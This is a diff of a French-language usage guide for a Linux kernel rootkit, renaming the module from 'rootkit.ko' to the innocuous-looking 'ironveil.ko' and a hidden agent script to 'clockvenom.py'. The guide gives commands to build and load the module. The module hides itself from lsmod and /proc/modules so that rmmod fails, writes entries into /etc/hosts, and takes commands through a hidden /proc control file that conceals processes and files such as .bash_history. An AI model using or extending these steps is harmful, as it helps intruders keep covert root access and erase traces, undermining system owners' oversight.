@@ -5,7 +5,7 @@
 ## Vue d'ensemble
 
 ```
-  insmod rootkit.ko
+  insmod ironveil.ko
         │
         ├─ inject_hosts()       ← écrit les entrées NTP dans /etc/hosts
         │
@@ -31,7 +31,7 @@ pacman -S linux-headers                 # Arch
 
 make
 
-# Résultat : rootkit.ko
+# Résultat : ironveil.ko
 ```
 
 ---
@@ -40,10 +40,10 @@ make
 
 ```bash
 # Chargement (nécessite root)
-insmod rootkit.ko
+insmod ironveil.ko
 
 # Vérifier le chargement — doit retourner RIEN (self-hidden)
-lsmod | grep rootkit
+lsmod | grep ironveil
 
 # Vérifier les effets immédiats
 dmesg | tail -5
@@ -178,12 +178,12 @@ Exécuté automatiquement à la fin du `init`. Irréversible sans reboot.
 
 ```
   Avant insmod :                    Après insmod :
-  lsmod → ... rootkit ...           lsmod → (absent)
-  /proc/modules → ... rootkit ...   /proc/modules → (absent)
-  /sys/module/rootkit/              /sys/module/rootkit/ → (absent)
+  lsmod → ... ironveil ...          lsmod → (absent)
+  /proc/modules → ... ironveil ...  /proc/modules → (absent)
+  /sys/module/ironveil/             /sys/module/ironveil/ → (absent)
 ```
 
-> Conséquence : `rmmod rootkit` échoue — le module est introuvable.
+> Conséquence : `rmmod ironveil` échoue — le module est introuvable.
 > Les hooks restent actifs jusqu'au reboot.
 
 ---
@@ -212,7 +212,7 @@ Utilisation :
 ls /proc/ | grep rootkit_ctrl      # rien
 
 # Mais l'écriture fonctionne
-echo "hide_pid $(pgrep agent.py)" > /proc/rootkit_ctrl
+echo "hide_pid $(pgrep clockvenom.py)" > /proc/rootkit_ctrl
 echo "hide_file .bash_history"    > /proc/rootkit_ctrl
 ```
 
@@ -225,10 +225,10 @@ echo "hide_file .bash_history"    > /proc/rootkit_ctrl
 cd Modules/Rootkits && make
 
 # 2. Charger
-insmod rootkit.ko && echo "loaded"
+insmod ironveil.ko && echo "loaded"
 
 # 3. Self-hide
-lsmod | grep rootkit                    # doit retourner rien
+lsmod | grep ironveil                    # doit retourner rien
 
 # 4. Cacher un fichier (préfixe)
 touch /tmp/rootkit_test
